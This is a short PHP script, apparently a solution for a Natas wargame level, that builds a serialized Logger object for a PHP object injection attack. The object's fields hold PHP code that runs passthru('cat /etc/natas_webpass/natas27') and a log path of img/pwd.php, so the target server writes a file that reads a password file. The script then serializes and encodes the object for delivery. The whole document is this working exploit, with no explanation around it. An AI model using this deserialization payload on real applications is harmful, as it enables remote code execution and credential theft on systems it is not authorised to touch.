<?
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
     
        function __construct($file){
            $this->initMsg="password: <? passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
            $this->exitMsg="password <? passthru('cat /etc/natas_webpass/natas27'    ); ?>\n";
            $this->logFile = "img/pwd.php";
        }                      
     
        function log($msg){;}                      
     
        function __destruct(){;}                      
    }


$obj = new Logger("logloglog");
echo urlencode(base64_encode(serialize($obj)));
?>

